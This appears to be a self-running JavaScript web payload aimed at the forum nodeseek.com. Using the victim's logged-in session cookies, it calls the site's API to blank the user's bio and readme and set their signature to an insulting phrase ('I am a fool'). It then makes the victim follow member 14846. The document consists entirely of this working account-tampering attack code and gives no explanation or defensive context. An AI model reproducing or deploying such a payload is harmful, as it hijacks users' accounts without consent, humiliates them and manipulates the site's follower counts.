async function sendRequests() {
  // 更新个人介绍信息
  await fetch("https://www.nodeseek.com/api/account/introduction", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      bio: '',
      signature: '我是傻福',
      readme: ''
    })
  });

  // 关注指定用户
  await fetch("https://www.nodeseek.com/api/fans/add", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      followed_member_id: 14846
    })
  });
}

sendRequests();
